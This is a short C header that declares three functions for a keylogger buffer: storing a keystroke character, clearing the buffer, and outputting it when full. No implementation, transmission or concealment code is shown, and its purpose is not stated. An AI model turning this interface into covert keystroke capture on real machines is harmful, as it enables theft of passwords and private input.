
// This just stores a char into the global keylogger buffer
// Clears and outputs buffer when it gets too full
void keylog_char(char c);

// Clears the global keylogger buffer
void clear_keylogger_buf(void);

// Output the keylogger buffer
void output_keylogger_buf(void);